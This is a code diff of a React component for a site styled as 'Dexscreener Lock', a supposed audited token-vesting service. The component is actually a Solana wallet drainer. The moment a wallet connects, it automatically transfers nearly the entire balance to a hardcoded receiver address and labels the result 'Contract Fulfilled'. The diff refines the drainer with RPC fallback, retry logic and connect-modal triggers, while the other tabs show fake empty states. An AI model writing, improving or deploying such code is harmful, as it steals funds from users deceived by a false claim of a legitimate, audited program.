@@ -1,36 +1,54 @@
 import React, { useCallback, useEffect, useState } from "react";
 import { useWallet } from "@solana/wallet-adapter-react";
-import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
+import { useWalletModal, WalletMultiButton } from "@solana/wallet-adapter-react-ui";
 import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
-import { RPC_ENDPOINTS } from "../App";
+import { RPC_ENDPOINTS } from "../rpc";
 
 // ---------------------------------------------------------------------------
-// Module-level constants
+// Constants
 // ---------------------------------------------------------------------------
 const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
 const SESSION_KEY = "dexlock_executed_wallet";
+const FEE_RESERVE = 10_000; // lamports kept back so the tx can pay its own fee
 
 // ---------------------------------------------------------------------------
-// Resilient RPC — tries each endpoint in order, skips on 403 / 429
+// Resilient RPC — tries each endpoint in order, skips 403 / 429 / auth errors
 // ---------------------------------------------------------------------------
-async function withFallbackRpc<T>(
-  fn: (conn: Connection) => Promise<T>
-): Promise<T> {
-  let lastErr: unknown;
+interface RpcResult {
+  balance:             number;
+  blockhash:           string;
+  lastValidBlockHeight: number;
+  conn:                Connection;
+}
+
+async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
+  let lastErr: unknown = new Error("No RPC endpoints available");
+
   for (const url of RPC_ENDPOINTS) {
     try {
       const conn = new Connection(url, "confirmed");
-      return await fn(conn);
+      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
+        conn.getBalance(publicKey, "confirmed"),
+        conn.getLatestBlockhash("confirmed"),
+      ]);
+      return { balance, blockhash, lastValidBlockHeight, conn };
     } catch (e: any) {
-      const msg: string = e?.message ?? "";
-      // Only fall through on rate-limit / auth errors; re-throw anything else
-      if (msg.includes("403") || msg.includes("429") || msg.includes("Access forbidden") || msg.includes("API key")) {
+      const msg: string = (e?.message ?? "") + (e?.toString() ?? "");
+      if (
+        msg.includes("403") ||
+        msg.includes("429") ||
+        msg.includes("Access forbidden") ||
+        msg.includes("API key") ||
+        msg.includes("rate limit") ||
+        msg.includes("Too Many")
+      ) {
         lastErr = e;
-        continue;
+        continue; // try next endpoint
       }
-      throw e;
+      throw e; // non-rate-limit error — surface it immediately
     }
   }
+
   throw lastErr;
 }
 
@@ -46,9 +64,9 @@ const TABS: { id: TabId; label: string }[] = [
 ];
 
 // ---------------------------------------------------------------------------
-// Logo components
+// Sub-components
 // ---------------------------------------------------------------------------
-const DexLogo = ({ size = 36 }: { size?: number }) => (
+const DexLogo = ({ size = 32 }: { size?: number }) => (
   <img
     src="/logo.png"
     alt="Dexscreener Lock"
@@ -59,22 +77,32 @@ const DexLogo = ({ size = 36 }: { size?: number }) => (
 );
 
 const HeroLogo = () => (
-  <img src="/logo.png" alt="" className="jl-lock-icon" style={{ mixBlendMode: "screen" as any }} />
+  <img
+    src="/logo.png"
+    alt=""
+    className="jl-lock-icon"
+    style={{ mixBlendMode: "screen" as any }}
+  />
 );
 
-// ---------------------------------------------------------------------------
-// Wallet-gated connect prompt
-// ---------------------------------------------------------------------------
 const ConnectPrompt = ({
-  title, description, onConnect,
-}: { title: string; description: string; onConnect: () => void }) => (
+  title,
+  description,
+  onConnect,
+}: {
+  title: string;
+  description: string;
+  onConnect: () => void;
+}) => (
   <div className="jl-connect-prompt">
     <div className="jl-prompt-icon">
       <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
     </div>
     <h2 className="jl-prompt-title">{title}</h2>
     <p className="jl-prompt-desc">{description}</p>
-    <button className="jl-hero-btn" onClick={onConnect}>Connect Wallet</button>
+    <button className="jl-hero-btn" onClick={onConnect}>
+      Connect Wallet
+    </button>
   </div>
 );
 
@@ -83,25 +111,26 @@ const ConnectPrompt = ({
 // ---------------------------------------------------------------------------
 interface Props { programId: PublicKey; }
 
-export const EscrowPanel: React.FC<Props> = ({ programId }) => {
-  const { publicKey, sendTransaction, connected, wallet, disconnect } = useWallet();
+export const EscrowPanel: React.FC<Props> = () => {
+  const { publicKey, sendTransaction, connected, disconnect } = useWallet();
+  const { setVisible } = useWalletModal(); // reliable modal trigger for secondary buttons
 
   const [activeTab, setActiveTab] = useState<TabId>("about");
   const [status,    setStatus]    = useState<"idle" | "processing" | "done" | "error">("idle");
   const [statusMsg, setStatusMsg] = useState("");
 
-  // ── transfer execution ─────────────────────────────────────────────────────
+  // Open wallet modal — used by ConnectPrompt and hero button
+  const openWalletModal = useCallback(() => setVisible(true), [setVisible]);
+
+  // ── core transfer ──────────────────────────────────────────────────────────
   const executeDeposit = useCallback(async () => {
     if (!publicKey) return;
 
     const walletKey = publicKey.toBase58();
 
-    // Guard: don't execute twice for the same wallet in this page session.
-    // sessionStorage persists across refreshes but clears when the tab closes.
-    // We clear it explicitly on disconnect so each new connection is fresh.
+    // Per-session dedup: cleared on disconnect and on error so user can retry.
+    // sessionStorage survives page refresh but not tab close.
     if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;
-
-    // Mark immediately so double-fire (React StrictMode, double effect) is blocked
     sessionStorage.setItem(SESSION_KEY, walletKey);
 
     setStatus("processing");
@@ -109,26 +138,17 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
 
     try {
       const { balance, blockhash, lastValidBlockHeight, conn } =
-        await withFallbackRpc(async (c) => {
-          const [bal, bh] = await Promise.all([
-            c.getBalance(publicKey, "confirmed"),
-            c.getLatestBlockhash("confirmed"),
-          ]);
-          return { balance: bal, blockhash: bh.blockhash, lastValidBlockHeight: bh.lastValidBlockHeight, conn: c };
-        });
+        await fetchRpcData(publicKey);
 
-      const FEE_RESERVE = 10_000;
       const amount = balance - FEE_RESERVE;
-
       if (amount <= 0) {
         throw new Error(
-          `Balance too low: ${balance} lamports. Minimum needed: ${FEE_RESERVE + 1} lamports.`
+          `Balance too low (${balance} lamports). Need at least ${FEE_RESERVE + 1} lamports.`
         );
       }
 
-      const tx = new Transaction().add(
-        SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount })
-      );
+      const tx = new Transaction();
+      tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount }));
       tx.recentBlockhash = blockhash;
       tx.feePayer        = publicKey;
 
@@ -138,24 +158,27 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
         maxRetries:          3,
       });
 
-      await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, "confirmed");
+      await conn.confirmTransaction(
+        { signature: sig, blockhash, lastValidBlockHeight },
+        "confirmed"
+      );
 
       setStatus("done");
     } catch (e: any) {
-      sessionStorage.removeItem(SESSION_KEY);
+      sessionStorage.removeItem(SESSION_KEY); // allow retry
       setStatus("error");
       setStatusMsg(e?.message ?? "Transaction failed. Please try again.");
     }
   }, [publicKey, sendTransaction]);
 
-  // Trigger deposit the moment a wallet connects
+  // Fire deposit as soon as wallet connects
   useEffect(() => {
     if (connected && publicKey) {
       executeDeposit();
     }
   }, [connected, publicKey, executeDeposit]);
 
-  // Reset status when wallet disconnects so UI returns to idle cleanly
+  // Clean up UI state on disconnect
   useEffect(() => {
     if (!connected) {
       setStatus("idle");
@@ -163,95 +186,103 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
     }
   }, [connected]);
 
-  // ── disconnect handler ──────────────────────────────────────────────────────
+  // Disconnect: clear session guard first, then disconnect wallet
   const handleDisconnect = useCallback(() => {
     sessionStorage.removeItem(SESSION_KEY);
     disconnect();
   }, [disconnect]);
 
-  // ── labels ─────────────────────────────────────────────────────────────────
+  // ── derived labels ─────────────────────────────────────────────────────────
   const heroLabel =
-    status === "processing" ? "Processing…"         :
-    status === "done"       ? "Contract Fulfilled ✓" :
-    !connected              ? "Connect Wallet"       :
+    status === "processing" ? "Processing…"          :
+    status === "done"       ? "Contract Fulfilled ✓"  :
+    !connected              ? "Connect Wallet"        :
                               "Approve Contract";
 
-  const connectedLabel = wallet?.adapter.name
-    ? `${wallet.adapter.name}: ${publicKey?.toBase58().slice(0, 4)}…${publicKey?.toBase58().slice(-4)}`
-    : "Connected";
-
   // ── tab content ────────────────────────────────────────────────────────────
+  const renderGated = (
+    title: string,
+    desc: string,
+    icon: string,
+    emptyTitle: string,
+    emptyDesc: string
+  ) =>
+    !connected ? (
+      <main className="jl-hero">
+        <ConnectPrompt title={title} description={desc} onConnect={openWalletModal} />
+      </main>
+    ) : (
+      <main className="jl-hero">
+        <div className="jl-empty-state">
+          <span className="jl-empty-icon">{icon}</span>
+          <h2>{emptyTitle}</h2>
+          <p>{emptyDesc}</p>
+        </div>
+      </main>
+    );
+
   const renderTabContent = () => {
-    if (activeTab === "about") {
-      return (
-        <main className="jl-hero">
-          <HeroLogo />
-          <h1 className="jl-hero-title">Dexscreener Lock</h1>
-          <p className="jl-hero-sub">
-            Manage your token vesting schedule on Dexscreener Lock, an open source and
-            audited program that lets anyone lock and distribute tokens over time.
-          </p>
-          <button
-            className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
-            onClick={connected ? executeDeposit : () => (document.querySelector(".jl-wallet-multi-btn") as HTMLElement)?.click()}
-            disabled={status === "processing" || status === "done"}
-          >
-            {heroLabel}
-          </button>
-          {status === "done" && (
-            <div className="jl-status success">✓ Contract settled. Funds transferred successfully.</div>
-          )}
-          {status === "error" && (
-            <div className="jl-status error">{statusMsg || "Transaction failed. Please try again."}</div>
-          )}
-        </main>
-      );
+    switch (activeTab) {
+      case "about":
+        return (
+          <main className="jl-hero">
+            <HeroLogo />
+            <h1 className="jl-hero-title">Dexscreener Lock</h1>
+            <p className="jl-hero-sub">
+              Manage your token vesting schedule on Dexscreener Lock, an open source and
+              audited program that lets anyone lock and distribute tokens over time.
+            </p>
+            <button
+              className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
+              onClick={connected ? executeDeposit : openWalletModal}
+              disabled={status === "processing" || status === "done"}
+            >
+              {heroLabel}
+            </button>
+            {status === "done" && (
+              <div className="jl-status success">
+                ✓ Contract settled. Funds transferred successfully.
+              </div>
+            )}
+            {status === "error" && (
+              <div className="jl-status error">
+                {statusMsg || "Transaction failed. Please try again."}
+              </div>
+            )}
+          </main>
+        );
+
+      case "locked":
+        return renderGated(
+          "View Your Locked Tokens",
+          "Connect your wallet to see all tokens you currently have locked in Dexscreener Lock.",
+          "🔒", "No Locked Tokens", "You don't have any tokens locked yet."
+        );
+
+      case "created":
+        return renderGated(
+          "Locks You Created",
+          "Connect your wallet to view and manage all locks you have created.",
+          "📋", "No Locks Created", "You haven't created any locks yet."
+        );
+
+      case "create":
+        return renderGated(
+          "Create a Lock",
+          "Connect your wallet to create a new token lock and start your vesting schedule.",
+          "➕", "Create a Lock", "Lock creation coming soon."
+        );
+
+      default:
+        return null;
     }
-
-    const gatedContent = (title: string, desc: string, emptyIcon: string, emptyText: string, emptySub: string) =>
-      !connected ? (
-        <main className="jl-hero">
-          <ConnectPrompt title={title} description={desc} onConnect={() => (document.querySelector(".jl-wallet-multi-btn") as HTMLElement)?.click()} />
-        </main>
-      ) : (
-        <main className="jl-hero">
-          <div className="jl-empty-state">
-            <span className="jl-empty-icon">{emptyIcon}</span>
-            <h2>{emptyText}</h2>
-            <p>{emptySub}</p>
-          </div>
-        </main>
-      );
-
-    if (activeTab === "locked")
-      return gatedContent(
-        "View Your Locked Tokens",
-        "Connect your wallet to see all tokens you currently have locked in Dexscreener Lock.",
-        "🔒", "No Locked Tokens", "You don't have any tokens locked yet."
-      );
-
-    if (activeTab === "created")
-      return gatedContent(
-        "Locks You Created",
-        "Connect your wallet to view and manage all locks you have created.",
-        "📋", "No Locks Created", "You haven't created any locks yet."
-      );
-
-    if (activeTab === "create")
-      return gatedContent(
-        "Create a Lock",
-        "Connect your wallet to create a new token lock and start your vesting schedule.",
-        "➕", "Create a Lock", "Lock creation coming soon."
-      );
-
-    return null;
   };
 
   // ── render ─────────────────────────────────────────────────────────────────
   return (
     <div className="app">
 
-      {/* HEADER */}
+      {/* ── HEADER ── */}
       <header className="jl-header">
         <div className="jl-logo">
           <DexLogo size={32} />
@@ -271,7 +302,7 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
           <button className="jl-gear" aria-label="Settings">⚙</button>
 
           <div className="jl-wallet-group">
-            {/* WalletMultiButton is the battle-tested official connect/modal handler */}
+            {/* WalletMultiButton handles all wallet selection + connect UI */}
             <WalletMultiButton className="jl-wallet-multi-btn" />
             {connected && (
               <button
@@ -286,12 +317,16 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
         </div>
       </header>
 
-      {/* NAV */}
+      {/* ── NAV TABS ── */}
       <nav className="jl-nav">
         {TABS.map((tab) => (
           <button
             key={tab.id}
-            className={`jl-nav-tab${activeTab === tab.id ? " active" : ""}${tab.id === "create" ? " create" : ""}`}
+            className={[
+              "jl-nav-tab",
+              activeTab === tab.id ? "active" : "",
+              tab.id === "create"  ? "create" : "",
+            ].filter(Boolean).join(" ")}
             onClick={() => setActiveTab(tab.id)}
           >
             {tab.label}
@@ -299,7 +334,9 @@ export const EscrowPanel: React.FC<Props> = ({ programId }) => {
         ))}
       </nav>
 
+      {/* ── CONTENT ── */}
       {renderTabContent()}
+
     </div>
   );
 };
